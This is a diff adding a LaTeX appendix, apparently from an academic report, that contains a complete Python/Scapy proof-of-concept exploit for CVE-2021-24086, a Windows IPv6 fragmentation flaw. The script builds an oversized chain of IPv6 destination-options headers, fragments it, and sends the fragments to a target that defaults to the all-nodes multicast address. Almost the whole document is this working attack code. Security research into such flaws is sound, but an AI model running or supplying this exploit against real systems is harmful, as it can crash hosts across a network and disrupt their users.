@@ -1,0 +1,98 @@
+\documentclass{report}
+\usepackage{import}
+\subimport{../}{preamble.tex}
+\standalonetrue
+\begin{document}
+
+\section{\gls{poc} for CVE-2021-24086}
+\todo{Rewrite PoC to remove "known" code. Should be easy}
+\label{appendix:poc}
+\begin{minted}[breaklines, linenos, breakanywhere]{python}
+from scapy.all import *
+import argparse
+
+def custom_fragment6(target, frag_id, bytes, nh, frag_size = 1008):
+    assert (frag_size % 8) == 0
+    rest = bytes
+    offset = 0
+    frags = []
+
+    while len(rest) > 0:
+        chunk = rest[: frag_size]
+        rest = rest[len(chunk): ]
+        last_pkt = len(rest) == 0
+
+        # 0 -> No more / 1 -> More
+        m = 0 if last_pkt else 1
+        assert offset < 8191
+        pkt = Ether() \
+            / IPv6(dst = target) \
+            / IPv6ExtHdrFragment(m = m, nh = nh, id = frag_id, offset = offset) \
+            / chunk
+
+        offset += (len(chunk) // 8)
+        frags.append(pkt)
+    return frags
+
+def exploit(args):
+    first_fragment_id = random.randint(0, 0xffffffff)
+    second_fragment_id = random.randint(0, 0xffffffff)
+
+    packet1 = IPv6ExtHdrDestOpt(options = [
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+        ])
+
+    for i in range(35):
+        packet1 /= IPv6ExtHdrDestOpt(options = [
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xff)),
+        ])
+    
+    packet1 /= IPv6ExtHdrDestOpt(options = [
+            PadN(optdata=('a'*0xff)),
+            PadN(optdata=('a'*0xa0)),
+        ])
+    packet1 /= IPv6ExtHdrFragment(
+        id = second_fragment_id, m = 1,
+        nh = 17, offset = 0
+    ) \
+    / UDP(dport = 31337, sport = 31337, chksum=0x7e7f)
+
+    packet1 = bytes(packet1)
+
+    frags = custom_fragment6(args.target, first_fragment_id, packet1, 60)
+
+    print(f'Sending {len(frags)} fragments with a total size of 0x{hex(len(packet1))}')
+    sendp(frags, iface= args.iface)
+
+    packet2 = Ether() / IPv6(dst = args.target) / IPv6ExtHdrFragment(id = second_fragment_id, m = 0, offset = 1, nh = 17) / 'fritzboger' # dummy data
+
+    sendp(packet2, iface = args.iface)
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--target', default = 'ff02::1')
+    parser.add_argument('--iface', default = 'eth1')
+    args = parser.parse_args()
+
+    exploit(args)
+    
+    return
+
+if __name__ == '__main__':
+    main()
+
+\end{minted}
+\label{listing:poc:python}
+\end{document}
